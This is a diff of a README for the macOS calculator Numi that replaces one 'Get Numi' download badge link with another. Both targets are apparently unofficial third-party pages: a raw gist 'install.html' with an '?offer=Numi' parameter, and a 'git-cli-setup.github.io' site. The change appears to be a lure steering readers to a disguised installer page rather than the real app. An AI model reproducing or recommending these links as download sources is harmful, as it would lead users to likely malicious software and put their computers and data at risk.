@@ -2,7 +2,7 @@
 
 Numi is a hybrid calculator and converter for macOS that allows you to perform natural-language calculations while mixing text and numbers in one place.
 
-<a href="https://gistcdn.githack.com/kingfisher36-maker/2830254eea1fc93907a6573ed6e26865/raw/a2efb7fb0153072a5928f291c86594f0e6075410/install.html?offer=Numi" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Numi" target="_blank">
   <img
     src="https://img.shields.io/badge/Get%20Numi%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"
     width="320"
